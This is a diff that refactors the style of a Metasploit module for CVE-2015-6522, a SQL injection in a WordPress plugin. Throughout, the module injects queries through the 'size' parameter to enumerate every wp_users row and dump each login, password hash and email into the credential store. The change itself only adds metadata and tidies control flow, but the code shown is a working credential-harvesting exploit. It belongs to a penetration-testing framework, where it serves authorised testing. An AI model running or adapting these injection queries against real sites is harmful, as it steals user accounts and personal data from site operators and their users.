@@ -25,7 +25,12 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2015-6522'],
           ['EDB', '37824']
         ],
-        'DisclosureDate' => '2015-08-18'
+        'DisclosureDate' => '2015-08-18',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -47,72 +52,72 @@ class MetasploitModule < Msf::Auxiliary
   def send_sql_request(sql_query)
     uri_complete = normalize_uri(uri_plugin)
 
-    begin
-      res = send_request_cgi(
-        'method' => 'GET',
-        'uri' => uri_complete,
-        'vars_get' => { 'size' => sql_query }
-      )
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => uri_complete,
+      'vars_get' => { 'size' => sql_query }
+    )
 
-      return nil if res.nil? || res.code != 200 || res.body.nil?
+    return nil if res.nil? || res.code != 200 || res.body.nil?
 
-      res.body
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE => e
-      vprint_error("#{peer} - The host was unreachable!")
-      return nil
-    end
+    res.body
+  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
+    vprint_error("#{peer} - The host was unreachable!")
+    return nil
   end
 
   def run
     vprint_status("#{peer} - Attempting to connect...")
     vprint_status("#{peer} - Trying to retrieve the first user id...")
     first_id = send_sql_request('id from wp_users order by id asc limit 1 ; --')
+
     if first_id.nil?
       vprint_error("#{peer} - Failed to retrieve the first user id... Try with check function!")
       return
-    else
-      vprint_status("#{peer} - First user-id is '#{first_id}'")
     end
+
+    vprint_status("#{peer} - First user-id is '#{first_id}'")
 
     vprint_status("#{peer} - Trying to retrieve the last user id...")
     last_id = send_sql_request('id from wp_users order by id desc limit 1 ; --')
+
     if last_id.nil?
       vprint_error("#{peer} - Failed to retrieve the last user id")
       return
-    else
-      vprint_status("#{peer} - Last user-id is '#{last_id}'")
     end
+
+    vprint_status("#{peer} - Last user-id is '#{last_id}'")
 
     credentials = ''
 
     vprint_status("#{peer} - Trying to retrieve the users information...")
     for user_id in first_id..last_id
-      separator = Rex::Text.rand_text_numeric(7, bad = '0')
+      separator = Rex::Text.rand_text_numeric(7, '0')
       user_info = send_sql_request("concat_ws(#{separator},user_login,user_pass,user_email) from wp_users where id = #{user_id} ; --")
 
       if user_info.nil?
         vprint_error("#{peer} - Failed to retrieve the users info")
         return
-      else
-        values = user_info.split(separator.to_s)
-
-        user_login = values[0]
-        user_pass = values[1]
-        user_email = values[2]
-
-        print_good("#{peer} - #{sprintf('%-15s %-34s %s', user_login, user_pass, user_email)}")
-        connection_details = {
-          module_fullname: fullname,
-          username: user_login,
-          private_data: user_pass,
-          private_type: :nonreplayable_hash,
-          status: Metasploit::Model::Login::Status::UNTRIED,
-          proof: user_email
-        }.merge(service_details)
-        create_credential(connection_details)
-
-        credentials << "#{user_login},#{user_pass},#{user_email}\n"
       end
+
+      values = user_info.split(separator.to_s)
+
+      user_login = values[0]
+      user_pass = values[1]
+      user_email = values[2]
+
+      print_good("#{peer} - %<user_login>-15s %<user_pass>-34s %<user_email>s", user_login: user_login, user_pass: user_pass, user_email: user_email)
+      connection_details = {
+        module_fullname: fullname,
+        username: user_login,
+        private_data: user_pass,
+        private_type: :nonreplayable_hash,
+        status: Metasploit::Model::Login::Status::UNTRIED,
+        proof: user_email
+      }.merge(service_details)
+      create_credential(connection_details)
+
+      credentials << "#{user_login},#{user_pass},#{user_email}\n"
     end
 
     unless credentials.empty?
